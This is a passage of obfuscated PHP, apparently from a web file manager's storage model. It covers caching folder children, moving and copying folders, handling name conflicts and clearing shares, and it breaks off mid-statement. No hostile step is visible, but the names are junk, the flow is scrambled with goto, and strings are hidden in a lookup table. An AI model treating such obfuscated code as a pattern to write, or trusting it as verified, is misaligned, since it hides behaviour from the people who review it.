C²óá«È»º: $fËèŒ½êãä =& $_SERVER[µ…]; $aÛø˜˜’Ò = $this->sourceInfo($f¢–ùŸÓõ±); $FœÌ—îËˆÓ = $fËèŒ½êãä[418]; goto CÜÛµ„ŒË‚; fƒ«éÌ¾¡: $fĞÅÈƒÚÛ = array_to_keyvalue($fĞÅÈƒÚÛ, $fËèŒ½êãä[390]); foreach ($fĞÅÈƒÚÛ as $eÖ‡•Æíàó) { $fâÌ¿¼„øù = $eÖ‡•Æíàó[$fËèŒ½êãä[472]]; $f¢–ùŸÓõ± = $eÖ‡•Æíàó[$fËèŒ½êãä[390]]; if (!isset($this->_childrenListCache[$f¢–ùŸÓõ±]) && $eÖ‡•Æíàó[$fËèŒ½êãä[397]] == $fËèŒ½êãä[86]) { $this->_childrenListCache[$f¢–ùŸÓõ±] = array(); } if (!isset($this->_childrenListCache[$fâÌ¿¼„øù])) { $this->_childrenListCache[$fâÌ¿¼„øù] = array(); } $this->_childrenListCache[$fâÌ¿¼„øù][$f¢–ùŸÓõ±] = $eÖ‡•Æíàó; $this->_childrenItemCache[$f¢–ùŸÓõ±] = $eÖ‡•Æíàó; } goto câÒœêêñ­; CÜÛµ„ŒË‚: $b²ƒŠô«™‘ = array($fËèŒ½êãä[481] => array($fËèŒ½êãä[507], $aÛø˜˜’Ò[$fËèŒ½êãä[481]] . $f¢–ùŸÓõ± . $fËèŒ½êãä[508]), $fËèŒ½êãä[417] => $this->targetIsDelete); $fĞÅÈƒÚÛ = $this->field($FœÌ—îËˆÓ)->where($b²ƒŠô«™‘)->select(); if (!$fĞÅÈƒÚÛ) { return; } goto fƒ«éÌ¾¡; câÒœêêñ­: } private function _childrenListAll($f¦¦²¾Ó², &$Aã«àÑæ‘õ) { $fò‹Èéà¡ã =& $_SERVER[µ…]; if (!isset($this->_childrenListCache[$f¦¦²¾Ó²])) { return; } $BŸ¹±‚‘Á = $this->_childrenListCache[$f¦¦²¾Ó²]; foreach ($BŸ¹±‚‘Á as $C‰¿„‰Â›ƒ => $AÊùğèå¹­) { $Aã«àÑæ‘õ[$C‰¿„‰Â›ƒ] = $AÊùğèå¹­; if ($AÊùğèå¹­[$fò‹Èéà¡ã[397]] == $fò‹Èéà¡ã[86]) { $this->_childrenListAll($C‰¿„‰Â›ƒ, $Aã«àÑæ‘õ); } } } private function sourceInfoCache($a†°àœùÃ×) { if (isset($this->_childrenItemCache[$a†°àœùÃ×])) { return $this->_childrenItemCache[$a†°àœùÃ×]; } return $this->sourceInfo($a†°àœùÃ×); } private function _childrenList($F—œå…°³°) { if (isset($this->_childrenListCache[$F—œå…°³°])) { return $this->_childrenListCache[$F—œå…°³°]; } return $this->_childrenListSelect($F—œå…°³°); } private function _childrenListSelect($CÏ¨›÷‚Ç) { goto a¯ñ¥ñŸò›; fÙÌ¬ä‹Ã: foreach ($DÈ°¹§÷Ó¡ as $CÏ¨›÷‚Ç => $b³…ƒ¸‘‹¶) { $this->_childrenItemCache[$CÏ¨›÷‚Ç] = $b³…ƒ¸‘‹¶; } return $DÈ°¹§÷Ó¡; goto Fîå²²òÛ; dËôÌÉ¿¤: $CòƒÊ”â¢ = $CòƒÊ”â¢ ? $CòƒÊ”â¢ : array(); $DÈ°¹§÷Ó¡ = array_to_keyvalue($CòƒÊ”â¢, $b¿ëÊŒ…“«[390]); $this->_childrenListCache[$CÏ¨›÷‚Ç] = $DÈ°¹§÷Ó¡; goto fÙÌ¬ä‹Ã; a¯ñ¥ñŸò›: $b¿ëÊŒ…“« =& $_SERVER[µ…]; $d‰¾‚­™â = array($b¿ëÊŒ…“«[472] => $CÏ¨›÷‚Ç, $b¿ëÊŒ…“«[417] => $this->targetIsDelete); $CòƒÊ”â¢ = $this->where($d‰¾‚­™â)->select(); goto dËôÌÉ¿¤; Fîå²²òÛ: } private function fileNameExistCache($d¤ µˆÅ­´, $d‚„í‰‘íÖ) { $A­ğ¢°Ş¾ =& $_SERVER[µ…]; $d‚„í‰‘íÖ = strtolower($d‚„í‰‘íÖ); $E£‹„Çßµ˜ = $this->_childrenList($d¤ µˆÅ­´); foreach ($E£‹„Çßµ˜ as $c‹· ÎªŠŠ) { if ($d‚„í‰‘íÖ == strtolower($c‹· ÎªŠŠ[$A­ğ¢°Ş¾[28]])) { return $c‹· ÎªŠŠ[$A­ğ¢°Ş¾[390]]; } } return !1; } private function fileNameAutoCache($Cê¿¡é ‡, $aÄ°¿ƒØØğ, $bˆÎ‘òÊ‡Ï, $AÂ”Óõ´¦) { $D·İ„…‚ =& $_SERVER[µ…]; $Cäï¶±Öß = $this->_childrenList($Cê¿¡é ‡); $bíò¿Õèà = array_to_keyvalue($Cäï¶±Öß, $D·İ„…‚[33], $D·İ„…‚[28]); return $this->fileNameAutoGet($bíò¿Õèà, $aÄ°¿ƒØØğ, $bˆÎ‘òÊ‡Ï, $AÂ”Óõ´¦); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($b‡¾„òŒˆ, $fÚ»§åŞ²¨, $e’ŞÍƒ­¶ = REPEAT_REPLACE, $EÔ³±™º¾‰ = '') { goto f“Õ¿£ºœÅ; f“Õ¿£ºœÅ: $dóœ»Á·ã =& $_SERVER[µ…]; $fªöáÔ°îè = $this->sourceInfo($b‡¾„òŒˆ); $Då†õ‡“„© = $this->sourceInfo($fÚ»§åŞ²¨); goto c—ëŠ²á°‚; FÑˆ’éÌ: $this->lockWriteStart($fÚ»§åŞ²¨, $dŸ‘Îê“ŒŠ); $Bô™çêÖ— = array($dóœ»Á·ã[524] => array(), $dóœ»Á·ã[555] => !1); $this->clearShare($b‡¾„òŒˆ, $fÚ»§åŞ²¨); goto D×¥Ä¸¶¦; e¨ëÑÃ‰–Â: $this->folderSizeReset($fÚ»§åŞ²¨); $fÀÕ²á—†Ò = array($fªöáÔ°îè[$dóœ»Á·ã[472]], $fÚ»§åŞ²¨); if ($fªöáÔ°îè[$dóœ»Á·ã[397]] == $dóœ»Á·ã[86]) { $fÀÕ²á—†Ò[] = $b‡¾„òŒˆ; } goto d„ËÖÄö„§; Cğ³ëÒ“¼¤: if ($fªöáÔ°îè[$dóœ»Á·ã[397]] == $dóœ»Á·ã[86] && $AêæÒ©Ù“²) { $this->folderSizeResetChildren($fï¯¯¬´™‡); } Model($dóœ»Á·ã[191])->linkAdd($Bô™çêÖ—[$dóœ»Á·ã[524]]); if ($AêæÒ©Ù“² && $Bô™çêÖ—[$dóœ»Á·ã[555]]) { $this->removeNow($b‡¾„òŒˆ, !1); } goto Eá¦ÈĞœ; E ğ…àò›ß: if ($fªöáÔ°îè[$dóœ»Á·ã[472]] == $fÚ»§åŞ²¨ && $EÔ³±™º¾‰ != $fªöáÔ°îè[$dóœ»Á·ã[28]]) { $D„­Ã‡¯ç = $this->fileNameExist($fÚ»§åŞ²¨, $EÔ³±™º¾‰); if ($D„­Ã‡¯ç && $fªöáÔ°îè[$dóœ»Á·ã[397]] == $dóœ»Á·ã[491]) { goto F¸·»Å“ù›; dñ£ÏÔÑãÊ: $this->removeNow($b‡¾„òŒˆ, !1); $this->folderSizeReset($fÚ»§åŞ²¨); Hook::trigger($dóœ»Á·ã[554], $EØ½šØí·º); goto B´Îš©·Ì; B´Îš©·Ì: return $D„­Ã‡¯ç; goto cñ‹êÉØÂï; F¸·»Å“ù›: $e…îÚ£ÈñÁ = $this->sourceInfo($D„­Ã‡¯ç); $BİôÛöÈ« = $this->fileHistory($e…îÚ£ÈñÁ, $fªöáÔ°îè[$dóœ»Á·ã[441]], $fªöáÔ°îè[$dóœ»Á·ã[77]]); if (!$BİôÛöÈ«) { Model($dóœ»Á·ã[444])->remove($fªöáÔ°îè[$dóœ»Á·ã[441]]); } goto dñ£ÏÔÑãÊ; cñ‹êÉØÂï: } } $dŸ‘Îê“ŒŠ = $EÔ³±™º¾‰ ? $EÔ³±™º¾‰ : $fªöáÔ°îè[$dóœ»Á·ã[28]]; $this->lockMoveStart($b‡¾„òŒˆ); goto FÑˆ’éÌ; Eá¦ÈĞœ: $this->lockMoveEnd($b‡¾„òŒˆ); $this->lockWriteEnd($fÚ»§åŞ²¨, $dŸ‘Îê“ŒŠ); $this->folderSizeReset($fªöáÔ°îè[$dóœ»Á·ã[472]]); goto e¨ëÑÃ‰–Â; d„ËÖÄö„§: $this->updateModifyTime($fÀÕ²á—†Ò); Model($dóœ»Á·ã[528])->eventMove($b‡¾„òŒˆ, $fªöáÔ°îè[$dóœ»Á·ã[472]], $fÚ»§åŞ²¨); Hook::trigger($dóœ»Á·ã[554], $EØ½šØí·º); goto e¯ï‰†ÜíË; D×¥Ä¸¶¦: $AêæÒ©Ù“² = $this->fileNameExistCache($fÚ»§åŞ²¨, $fªöáÔ°îè[$dóœ»Á·ã[28]]); $fï¯¯¬´™‡ = $this->_move($b‡¾„òŒˆ, $fÚ»§åŞ²¨, $e’ŞÍƒ­¶, $Bô™çêÖ—, $EÔ³±™º¾‰); $this->sourceCacheClear(); goto Cğ³ëÒ“¼¤; c—ëŠ²á°‚: if ($fªöáÔ°îè[$dóœ»Á·ã[472]] == $Då†õ‡“„©[$dóœ»Á·ã[390]]) { if ($fªöáÔ°îè[$dóœ»Á·ã[417]] == $dóœ»Á·ã[86]) { Model($dóœ»Á·ã[415])->restore(array($b‡¾„òŒˆ)); } if (!$EÔ³±™º¾‰ || $EÔ³±™º¾‰ == $fªöáÔ°îè[$dóœ»Á·ã[28]]) { return $b‡¾„òŒˆ; } } $EØ½šØí·º = $this->pathInfoMore($b‡¾„òŒˆ); if ($this->isParentOf($b‡¾„òŒˆ, $fÚ»§åŞ²¨)) { return !1; } goto d÷‘™‘Ö•Ë; d÷‘™‘Ö•Ë: if (!$fªöáÔ°îè || !$Då†õ‡“„© || $Då†õ‡“„©[$dóœ»Á·ã[397]] != $dóœ»Á·ã[86]) { return !1; } Hook::trigger($dóœ»Á·ã[553], $EØ½šØí·º); $this->targetIsDelete = intval($fªöáÔ°îè[$dóœ»Á·ã[417]]); goto E ğ…àò›ß; e¯ï‰†ÜíË: return $fï¯¯¬´™‡; goto d·ˆºÎùí¨; d·ˆºÎùí¨: } private function _move($Fæ…ŞÙ”Š, $e£ÕŠÕ³¡¢, $c™ˆ‚©¿Ñ”, &$E¤íÃËøôá, $E÷Âó‘ï±õ = '') { goto bÛ—Ä¦¹¯; CĞİ„²³³­: $this->lockWriteStart($e£ÕŠÕ³¡¢, $F„ìááÇŒ); if (!$B³¶çí¿£) { return $this->_moveForce($Fæ…ŞÙ”Š, $e£ÕŠÕ³¡¢, $F„ìááÇŒ); } $fÂ™´Ş»Ğ = $B³¶çí¿£; goto dÁ†¼³ƒ£¯; fìæŒ„íÀ³: $F„ìááÇŒ = $E÷Âó‘ï±õ ? $E÷Âó‘ï±õ : $c±ÌÛÁçîœ[$AƒõÚ´îš[28]]; $B³¶çí¿£ = $this->fileNameExistCache($e£ÕŠÕ³¡¢, $F„ìááÇŒ); $this->lockMoveStart($Fæ…ŞÙ”Š); goto CĞİ„²³³­; BáĞğ“®Åƒ: return $fÂ™´Ş»Ğ; goto D´¸²Œá™’; dÁ†¼³ƒ£¯: $a£õŸ™À¥” = !1; if ($C“¢¥‘Ç¸) { if ($c™ˆ‚©¿Ñ” == REPEAT_RENAME_FOLDER) { $F„ìááÇŒ = $this->fileNameAuto($e£ÕŠÕ³¡¢, $F„ìááÇŒ, $c™ˆ‚©¿Ñ”, $C“¢¥‘Ç¸); $fÂ™´Ş»Ğ = $this->_moveForce($Fæ…ŞÙ”Š, $e£ÕŠÕ³¡¢, $F„ìááÇŒ); } else { if ($c™ˆ‚©¿Ñ” == REPEAT_RENAME_FOLDER) { $c™ˆ‚©¿Ñ” = REPEAT_RENAME; } $bĞ¶„Øùİ° = $this->_childrenListSelect($Fæ…ŞÙ”Š); foreach ($bĞ¶„Øùİ° as $EİËº†ÙÄƒ) { $this->_move($EİËº†ÙÄƒ[$AƒõÚ´îš[390]], $B³¶çí¿£, $c™ˆ‚©¿Ñ”, $E¤íÃËøôá); } $a£õŸ™À¥” = !0; } } else { if ($c™ˆ‚©¿Ñ” == REPEAT_SKIP) { $a£õŸ™À¥” = !0; } else { if ($c™ˆ‚©¿Ñ” == REPEAT_RENAME || $c™ˆ‚©¿Ñ” == REPEAT_RENAME_FOLDER) { $F„ìááÇŒ = $this->fileNameAuto($e£ÕŠÕ³¡¢, $F„ìááÇŒ, $c™ˆ‚©¿Ñ”, $C“¢¥‘Ç¸); $fÂ™´Ş»Ğ = $this->_moveForce($Fæ…ŞÙ”Š, $e£ÕŠÕ³¡¢, $F„ìááÇŒ); } else { if ($c™ˆ‚©¿Ñ” == REPEAT_REPLACE) { $BÒ´£†šÓ¬ = $this->sourceInfoCache($B³¶çí¿£); $cÔ¹Ë´¢íÄ = $this->fileHistory($BÒ´£†šÓ¬, $c±ÌÛÁçîœ[$AƒõÚ´îš[441]], $c±ÌÛÁçîœ[$AƒõÚ´îš[77]]); if ($cÔ¹Ë´¢íÄ) { $E¤íÃËøôá[$AƒõÚ´îš[524]][] = $c±ÌÛÁçîœ[$AƒõÚ´îš[441]]; } else { $a£õŸ™À¥” = !0; } } } } } if ($a£õŸ™À¥” && !$E¤íÃËøôá[$AƒõÚ´îš[555]]) { $E¤íÃËøôá[$AƒõÚ´îš[555]] = !0; } goto BáĞğ“®Åƒ; bÛ—Ä¦¹¯: $AƒõÚ´îš =& $_SERVER[µ…]; $c±ÌÛÁçîœ = $this->sourceInfo($Fæ…ŞÙ”Š); $C“¢¥‘Ç¸ = $c±ÌÛÁçîœ[$AƒõÚ´îš[397]] == $AƒõÚ´îš[86]; goto fìæŒ„íÀ³; D´¸²Œá™’: } private function _moveForce($a¶¢Â¾ğß”, $CÃ‘¨¥Çæ, $fä§öø§ìÈ) { goto AéÔæÌ‘—; b ‰×ÇÑÇ: $CÄ“·ÛÅ£ï = $FÒãÍâÇÀ©[$e¡ŠÊÓÃÌ[397]] == $e¡ŠÊÓÃÌ[86]; $e†“ó÷é² = array($e¡ŠÊÓÃÌ[389] => $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[390]], $e¡ŠÊÓÃÌ[548] => $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[481]] . $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[390]] . $e¡ŠÊÓÃÌ[47], $e¡ŠÊÓÃÌ[544] => $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[398]], $e¡ŠÊÓÃÌ[545] => $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[478]], $e¡ŠÊÓÃÌ[547] => USER_ID, $e¡ŠÊÓÃÌ[407] => $fä§öø§ìÈ); $c¹õÎ±ä±• = $FÒãÍâÇÀ©[$e¡ŠÊÓÃÌ[398]] == SourceModel::TYPE_GROUP && $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[398]] == SourceModel::TYPE_GROUP && $FÒãÍâÇÀ©[$e¡ŠÊÓÃÌ[478]] == $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[478]]; goto fóä¶äè§ª; AéÔæÌ‘—: $e¡ŠÊÓÃÌ =& $_SERVER[µ…]; $FÒãÍâÇÀ© = $this->sourceInfo($a¶¢Â¾ğß”); $Eè¯Şßø‚È = $this->sourceInfo($CÃ‘¨¥Çæ); goto b ‰×ÇÑÇ; D†Ûâ¹Ûßƒ: if ($CÄ“·ÛÅ£ï) { $BÕæ÷¼’Ğ = array($e¡ŠÊÓÃÌ[548] => array($e¡ŠÊÓÃÌ[507], $FÒãÍâÇÀ©[$e¡ŠÊÓÃÌ[481]] . $FÒãÍâÇÀ©[$e¡ŠÊÓÃÌ[390]] . $e¡ŠÊÓÃÌ[508])); $FÀ¿º”™êÃ = $FÒãÍâÇÀ©[$e¡ŠÊÓÃÌ[481]] . $FÒãÍâÇÀ©[$e¡ŠÊÓÃÌ[390]] . $e¡ŠÊÓÃÌ[47]; $CĞ™ğ»Å = $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[481]] . $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[390]] . $e¡ŠÊÓÃÌ[47] . $FÒãÍâÇÀ©[$e¡ŠÊÓÃÌ[390]] . $e¡ŠÊÓÃÌ[47]; $c«ÌêîÑ­» = array($e¡ŠÊÓÃÌ[548] => array($e¡ŠÊÓÃÌ[556], "\162\145\x70\154\141\143\x65\50\160\x61\x72\145\x6e\x74\x4c\x65\166\145\154\x2c\x27{$FÀ¿º”™êÃ}\47\54\47{$CĞ™ğ»Å}\47\51"), $e¡ŠÊÓÃÌ[544] => $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[398]], $e¡ŠÊÓÃÌ[545] => $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[478]]); if ($d¿ôÕ‚ƒŒš) { $c«ÌêîÑ­»[$e¡ŠÊÓÃÌ[416]] = 0; } $this->where($BÕæ÷¼’Ğ)->data($c«ÌêîÑ­»)->save(); } $this->where(array($e¡ŠÊÓÃÌ[404] => $a¶¢Â¾ğß”))->data($e†“ó÷é²)->save(); return $a¶¢Â¾ğß”; goto fó¬äôğ•‘; fóä¶äè§ª: if (!$c¹õÎ±ä±• && $this->moveClearAuth) { Model($e¡ŠÊÓÃÌ[476])->authClear($a¶¢Â¾ğß”); } $d¿ôÕ‚ƒŒš = $FÒãÍâÇÀ©[$e¡ŠÊÓÃÌ[417]] == $e¡ŠÊÓÃÌ[86] && $Eè¯Şßø‚È[$e¡ŠÊÓÃÌ[417]] != $e¡ŠÊÓÃÌ[86]; if ($d¿ôÕ‚ƒŒš) { $e†“ó÷é²[$e¡ŠÊÓÃÌ[416]] = 0; } goto D†Ûâ¹Ûßƒ; fó¬äôğ•‘: } private function clearShare($d­ÈèŞä¾å, $c´¥óçİÖ) { goto a‰˜‡†Ú‡³; F‚Â­Ú³’ß: if ($cñŸğßÒŠå[$bë¶œäÙÕø[478]] == $bê§À¤„Ãà[$bë¶œäÙÕø[478]] && $cñŸğßÒŠå[$bë¶œäÙÕø[398]] == $bë¶œäÙÕø[557]) { return; } $AÍÃ‚©ç‚“ = array($bë¶œäÙÕø[481] => array($bë¶œäÙÕø[507], $cñŸğßÒŠå[$bë¶œäÙÕø[481]] . $d­ÈèŞä¾å . $bë¶œäÙÕø[508])); $E¯å‹Ù‹÷ = $this->field($bë¶œäÙÕø[404])->where($AÍÃ‚©ç‚“)->getField($bë¶œäÙÕø[390], !0); goto Añˆ®¡ß´É; eæáÃÃÄí: if (!$A¾÷ˆ‚ÓÉ¥) { return; } $A¾÷ˆ‚ÓÉ¥ = array_to_keyvalue($A¾÷ˆ‚ÓÉ¥, $bë¶œäÙÕø[33], $bë¶œäÙÕø[462]); $AÍÃ‚©ç‚“ = array($bë¶œäÙÕø[462] => array($bë¶œäÙÕø[7], $A¾÷ˆ‚ÓÉ¥)); goto bå½“×§; bå½“×§: Model($bë¶œäÙÕø[558])->where($AÍÃ‚©ç‚“)->save(array($bë¶œäÙÕø[469] => 0)); Model($bë¶œäÙÕø[559])->where($AÍÃ‚©ç‚“)->delete(); goto E©Å™Ø¯¢‰; Añˆ®¡ß´É: if (!$E¯å‹Ù‹÷) { return; } $AÍÃ‚©ç‚“ = array($bë¶œäÙÕø[390] => array($bë¶œäÙÕø[7], $E¯å‹Ù‹÷), $bë¶œäÙÕø[469] => 1); $A¾÷ˆ‚ÓÉ¥ = Model($bë¶œäÙÕø[558])->field($bë¶œäÙÕø[462])->where($AÍÃ‚©ç‚“)->select(); goto eæáÃÃÄí; a‰˜‡†Ú‡³: $bë¶œäÙÕø =& $_SERVER[µ…]; $cñŸğßÒŠå = $this->sourceInfo($d­ÈèŞä¾å); $bê§À¤„Ãà = $this->sourceInfo($c´¥óçİÖ); goto F‚Â­Ú³’ß; E©Å™Ø¯¢‰: } public function copyFolderFromIO($B‘£•©ïÀ‚, $eê†ó´á½’, $cİ² ™„çº, $c„ ºàªé·, $cÛ¿¾‘ëê, $aËË§ÆŒ¿‰ = false) { goto Fê¥Š½¾´¶; Fê¥Š½¾´¶: $Bæßğİù’” =& $_SERVER[µ…]; $c»‚ğŒù·Ö = array($Bæßğİù’”[525] => array(), $Bæßğİù’”[526] => array(), $Bæßğİù’”[524] => array(), $Bæßğİù’”[560] => array()); $Bˆ…˜™šÑ† = $aËË§ÆŒ¿‰ ? $aËË§ÆŒ¿‰ : $B‘£•©ïÀ‚->pathThis($eê†ó´á½’); goto Dùª‚™—”Ğ; fªëáÑ¿õ: Model($Bæßğİù’”[527])->addAll($c»‚ğŒù·Ö[$Bæßğİù’”[525]], array(), !0); Model($Bæßğİù’”[528])->eventCopy($c¸‰Ë¢…»¥); $this->saveAll($c»‚ğŒù·Ö[$Bæßğİù’”[526]]); goto Aº×¦Œ‰Ø; aöˆ¡Ù¡ƒ¤: $this->updateModifyTime($cİ² ™„çº); return $c¸‰Ë¢…»¥; goto cÊº±ŞÊ‹İ; Aº×¦Œ‰Ø: Model($Bæßğİù’”[444])->linkAdd($c»‚ğŒù·Ö[$Bæßğİù’”[524]]); Model($Bæßğİù’”[444])->remove($c»‚ğŒù·Ö[$Bæßğİù’”[560]]); $this->folderSizeReset($cİ² ™„çº); goto aöˆ¡Ù¡ƒ¤; aÅ‹èÒ÷†ô: Hook::trigger($Bæßğİù’”[562]); if ($c¸‰Ë¢…»¥) { $this->folderSizeResetChildren($c¸‰Ë¢…»¥); } $this->_childrenListClear(); goto fªëáÑ¿õ; Dùª‚™—”Ğ: $A‰´ó¿í¢² = $this->fileNameExist($cİ² ™„çº, $Bˆ…˜™šÑ†); $c¸‰Ë¢…»¥ = $this->mkdir($cİ² ™„çº, $Bˆ…˜™šÑ†, $c„ ºàªé·); if (!$A‰´ó¿í¢² || $c„ ºàªé· == REPEAT_RENAME_FOLDER) { $c„ ºàªé· = !1; } goto D‰°†Êöé”; D‰°†Êöé”: if ($A‰´ó¿í¢²) { $this->_childrenAllMake($A‰´ó¿í¢²); } Hook::trigger($Bæßğİù’”[561]); $this->_copyChildTo($B‘£•©ïÀ‚, $eê†ó´á½’, $c¸‰Ë¢…»¥, $c„ ºàªé·, $c»‚ğŒù·Ö, $cÛ¿¾‘ëê); goto aÅ‹èÒ÷†ô; cÊº±ŞÊ‹İ: } private function _copyChildTo($CÇÒ³øÌ©„, $EÈĞ‘Ãªé¡, $Bˆù›ßçá‹, $a×ÙÉù¬£‡, &$fÁ å°ë±, $FÍ‚ãğ½’¡) { goto Bî³Š—¬¼; f’òİÍã: $D™”í¥ğê‰ = $this->_childrenList($Bˆù›ßçá‹); $D™”í¥ğê‰ = array_to_keyvalue($D™”í¥ğê‰, $EÓùÛÄ‘Ú[28]); foreach ($Dã˜•Œ¾» as $B“®‰ÖÃÀ) { $FÕ¤±ÓÂ¦ = $D™”í¥ğê‰[$B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[28]]]; $d§Š©¨—¥ = $FÕ¤±ÓÂ¦[$EÓùÛÄ‘Ú[390]]; $this->_copyApplyMeta($FÕ¤±ÓÂ¦, $fÁ å°ë±); if ($B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[29]] == $EÓùÛÄ‘Ú[76]) { $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[75]] = $CÇÒ³øÌ©„->getPathInner($B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[75]]); $this->_copyChildTo($CÇÒ³øÌ©„, $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[75]], $d§Š©¨—¥, $a×ÙÉù¬£‡, $fÁ å°ë±, $FÍ‚ãğ½’¡); } } goto Fƒ´ƒ²ø÷; CÎ…É‡Ï Î: $Dã˜•Œ¾» = array_merge($EãÑªéåñ‹[$EÓùÛÄ‘Ú[73]], $EãÑªéåñ‹[$EÓùÛÄ‘Ú[74]]); $A¯¬„°Ôƒº = $this->_addFiles($CÇÒ³øÌ©„, $EãÑªéåñ‹[$EÓùÛÄ‘Ú[73]], $FÍ‚ãğ½’¡); $d—‡»‹ô¥Ø = array(); goto CïøÃ…‰„¨; CïøÃ…‰„¨: foreach ($Dã˜•Œ¾» as &$B“®‰ÖÃÀ) { goto f¿ï¤¡ˆ½«; fï¾åáöµĞ: $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[77]] = _get($B“®‰ÖÃÀ, $EÓùÛÄ‘Ú[77], 0); $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[441]] = _get($B“®‰ÖÃÀ, $EÓùÛÄ‘Ú[441], 0); if (!isset($B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[563]]) && $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[441]]) { $fÁ å°ë±[$EÓùÛÄ‘Ú[560]][] = $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[441]]; } goto fëêÏŞ©ÃÏ; fëêÏŞ©ÃÏ: if ($a×ÙÉù¬£‡) { $C¥œŠ››—¡ = $this->fileNameExistCache($Bˆù›ßçá‹, $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[28]]); if ($C¥œŠ››—¡) { if ($B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[397]] || $a×ÙÉù¬£‡ == REPEAT_SKIP) { continue; } if ($a×ÙÉù¬£‡ == REPEAT_REPLACE) { $FÕ¤±ÓÂ¦ = $this->sourceInfoCache($C¥œŠ››—¡); $fæË´Ü²  = $this->fileHistory($FÕ¤±ÓÂ¦, $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[441]], $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[77]]); if ($fæË´Ü² ) { $fÁ å°ë±[$EÓùÛÄ‘Ú[524]][] = $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[441]]; } continue; } else { if ($a×ÙÉù¬£‡ == REPEAT_RENAME) { $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[28]] = $this->fileNameAutoCache($Bˆù›ßçá‹, $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[28]], $a×ÙÉù¬£‡, !1); } } } } if (!$B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[397]] && $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[441]]) { $fÁ å°ë±[$EÓùÛÄ‘Ú[524]][] = $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[441]]; } $d—‡»‹ô¥Ø[] = $this->_makeItemData($B“®‰ÖÃÀ, $eÃ©Ù²Œ´, $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[28]]); goto Aå¹¼¡Şã; f¿ï¤¡ˆ½«: if (isset($A¯¬„°Ôƒº[$B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[28]]])) { $B“®‰ÖÃÀ = $A¯¬„°Ôƒº[$B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[28]]]; } $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[397]] = $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[29]] == $EÓùÛÄ‘Ú[76]; $B“®‰ÖÃÀ[$EÓùÛÄ‘Ú[399]] = _get($B“®‰ÖÃÀ, $EÓùÛÄ‘Ú[167], $EÓùÛÄ‘Ú[33]); goto fï¾åáöµĞ; Aå¹¼¡Şã: } unset($B“®‰ÖÃÀ); if (!empty($d—‡»‹ô¥Ø)) { $this->addAll($d—‡»‹ô¥Ø); $this->_childrenListSelect($Bˆù›ßçá‹); } goto f’òİÍã; Bî³Š—¬¼: $EÓùÛÄ‘Ú =& $_SERVER[µ…]; $eÃ©Ù²Œ´ = $this->sourceInfoCache($Bˆù›ßçá‹); $EãÑªéåñ‹ = $CÇÒ³øÌ©„->listPath($EÈĞ‘Ãªé¡); goto CÎ…É‡Ï Î; Fƒ´ƒ²ø÷: } private function _addFiles($CµİíÓ‹º”, $f³§Õ°…åî, $cŞÂ°˜£) { goto C·³‹Äøæ; Aó´Îâ’«: foreach ($f³§Õ°…åî as &$D‘øÈ±Ûå) { goto c™éÔ´´’¨; c™éÔ´´’¨: Hook::trigger($fàöùŒÏ„Æ[564], $D‘øÈ±Ûå); $D‘øÈ±Ûå[$fàöùŒÏ„Æ[75]] = $CµİíÓ‹º”->getPathInner($D‘øÈ±Ûå[$fàöùŒÏ„Æ[75]]); $cËï¡æÉñ¿ = $CµİíÓ‹º”->hashSimple($D‘øÈ±Ûå[$fàöùŒÏ„Æ[75]]); goto Eº‘ë‚êÓ; B›„½ÂŞŸÏ: if (count($EàšãÓ’í²[$AÖ‰ÆÇå]) > 1) { $D‘øÈ±Ûå[$fàöùŒÏ„Æ[563]] = !0; } goto e·Æ‹æÑ; d¾Á°‰Ÿ—«: $D‘øÈ±Ûå[$fàöùŒÏ„Æ[169]] = $AÖ‰ÆÇå; Hook::trigger($fàöùŒÏ„Æ[565], $D‘øÈ±Ûå); $EàšãÓ’í²[$AÖ‰ÆÇå][] =& $D‘øÈ±Ûå; goto B›„½ÂŞŸÏ; Eº‘ë‚êÓ: $AÖ‰ÆÇå = $CµİíÓ‹º”->hashMd5($D‘øÈ±Ûå[$fàöùŒÏ„Æ[75]]); if (strlen($AÖ‰ÆÇå) > 10 && !isset($EàšãÓ’í²[$AÖ‰ÆÇå])) { $EàšãÓ’í²[$AÖ‰ÆÇå] = array(); } $D‘øÈ±Ûå[$fàöùŒÏ„Æ[170]] = $cËï¡æÉñ¿; goto d¾Á°‰Ÿ—«; e·Æ‹æÑ: } unset($D‘øÈ±Ûå); $a ÕëÆÛ„É = array($fàöùŒÏ„Æ[169] => array($fàöùŒÏ„Æ[7], array_keys($EàšãÓ’í²))); goto bÅ’öÙà³Õ; eŞ±•¥×—„: $A±Š¶õø¾—->addAll($Aš£–ŒßÀ); $a ÕëÆÛ„É = 